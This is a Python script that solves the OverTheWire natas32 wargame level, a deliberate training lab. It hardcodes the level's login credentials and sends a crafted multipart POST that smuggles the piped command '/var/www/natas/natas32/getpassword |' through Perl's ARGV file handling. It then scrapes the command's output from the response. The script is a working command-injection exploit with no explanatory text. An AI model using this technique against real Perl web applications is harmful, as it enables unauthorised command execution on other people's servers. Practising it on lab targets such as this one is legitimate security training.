import requests
import re

base_url = "http://natas32.natas.labs.overthewire.org/index.pl"

s = requests.session()

username = "natas32"
password = "Yp5ffyfmEdjvTOwpN5HCvh7Ctgf9em3G"

s = requests.session()

file = open("file.csv", "w")
file.write("1,2,3,4")
file.close()

req =  requests.Request("POST", base_url + "?/var/www/natas/natas32/getpassword |", 
              data={'file': 'ARGV'},
             files={'file': open("file.csv", "rb")},
             auth=(username, password))
preppedReq = req.prepare()
# print(str(preppedReq.body).replace("\\r\\n", "\n"))

res = s.send(preppedReq)

commandOutput = re.sub('<[^<]+?>', '', res.text.split("</style>")[1])[12:-20]

print("="*80)
print(commandOutput)
print("="*80)

